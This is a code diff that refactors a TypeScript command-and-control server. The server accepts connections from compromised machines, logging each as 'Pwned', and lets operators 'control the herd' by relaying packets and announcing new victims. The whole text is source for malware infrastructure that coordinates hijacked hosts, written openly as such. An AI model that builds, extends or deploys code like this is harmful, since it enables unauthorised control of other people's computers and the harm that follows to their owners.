@@ -1,56 +1,72 @@
-import hosts = require('./hosts');
-import controllers = require('./controllers');
+import { Host, HostServer } from './hosts';
+import { ControlServer, RemoteController } from './controllers';
+import { PacketTypes } from '../../common/src/protocol';
 
 interface CombinedServerOpts {
-    host: string | undefined;
-    port: number | undefined;
-    controlHost: string | undefined;
-    controlPort: number | undefined;
+    [key: string]: string | number | undefined;
+    host?: string;
+    port?: number;
+    controlHost?: string;
+    controlPort?: number;
+}
+
+interface ResolvedCombinedServerOpts {
+    [key: string]: string | number;
+    readonly host: string;
+    readonly port: number;
+    readonly controlHost: string;
+    readonly controlPort: number;
 }
 
 export class CombinedServer {
-    hostList: Map<number, hosts.Host>;
-    controllerList: Map<number, controllers.Controller>;
+    hostList: Map<number, Host>;
+    controllerList: Map<number, RemoteController>;
     nextHostID: number;
     nextControllerID: number;
-    hostServer: hosts.HostServer;
-    controlServer: controllers.ControlServer;
+    hostServer: HostServer | null;
+    controlServer: ControlServer | null;
+    opts: ResolvedCombinedServerOpts;
 
-    constructor(opts: CombinedServerOpts) {
-        const defaultOpts: CombinedServerOpts = {
+    constructor(public packetTypes: PacketTypes, opts: CombinedServerOpts) {
+        const defaultOpts: ResolvedCombinedServerOpts = {
             host: '0.0.0.0',
             port: 6996,
             controlHost: '127.0.0.1',
             controlPort: 35768
         };
         
-        // for (let optName in defaultOpts) {
-        //     for (optName in opts)) {
-        //         opts[optName]
-        //     }
-        // }
+        for (let optName in defaultOpts) {
+            if (!(optName in opts)) {
+                opts[optName] = defaultOpts[optName];
+            }
+        }
+        this.opts = opts as ResolvedCombinedServerOpts;
 
         this.hostList = new Map();
         this.controllerList = new Map();
         this.nextHostID = 0;
         this.nextControllerID = 0;
+        this.hostServer = null;
+        this.controlServer = null;
+    }
 
-        this.hostServer = hosts.createServer(hostIP, port, () => {
-            console.log(`Listening for incoming connections at ${hostIP}:${port}`);
-        });
+    run() {
+        this.hostServer = HostServer.createServer(this.opts.host, this.opts.port, () => {
+            console.log(`Listening for incoming connections at ${this.opts.host}:${this.opts.port}`);
+        }, this.packetTypes);
         this.hostServer.on('connection', this.handleHostConnection.bind(this));
-        this.controlServer = controllers.createServer(controlHostIP, controlPort, () => {
-            console.log(`[>] Connect to control server at ${controlHostIP}:${controlPort}`);
-        });
+        this.controlServer = ControlServer.createServer(this.opts.controlHost, this.opts.controlPort, () => {
+            console.log(`[>] Connect to control server at ${this.opts.controlHost}:${this.opts.controlPort}`);
+        }, this.packetTypes);
         this.controlServer.on('connection', this.handleControllerConnection.bind(this));
     }
 
-    handleHostConnection(host: hosts.Host) {
+    handleHostConnection(host: Host) {
         console.log(`[+] Pwned ${host.ip} ;)`);
         let hostID = this.nextHostID++;
         this.hostList.set(hostID, host);
         host.on('packet', (packet) => {
-            let wrappedPkt = createPacket('control', 'response', 'hostresponse');
+            let wrappedPkt = this.packetTypes.createPacket('control', 'response', 'hostresponse');
             wrappedPkt.id = hostID;
             wrappedPkt.data = packet;
             for (let c of this.controllerList.values()) {
@@ -66,7 +82,7 @@ export class CombinedServer {
             console.log(`[!] Host ${host.ip} forcibly exited`);
         });
 
-        let packet = createPacket('control', 'response', 'newpwn');
+        let packet = this.packetTypes.createPacket('control', 'response', 'newpwn');
         packet.id = hostID;
         packet.ip = host.ip;
         for (let c of this.controllerList.values()) {
@@ -74,12 +90,12 @@ export class CombinedServer {
         }
     }
 
-    handleControllerConnection(controller: controllers.Controller) {
+    handleControllerConnection(controller: RemoteController) {
         console.log(`[+] Now controlling the herd from ${controller.ip}`);
         let controllerID = this.nextControllerID++;
         this.controllerList.set(controllerID, controller);
         for (let [id, host] of this.hostList) {
-            let packet = createPacket('control', 'response', 'newpwn');
+            let packet = this.packetTypes.createPacket('control', 'response', 'newpwn');
             packet.id = id;
             packet.ip = host.ip;
             controller.sendPacket(packet);
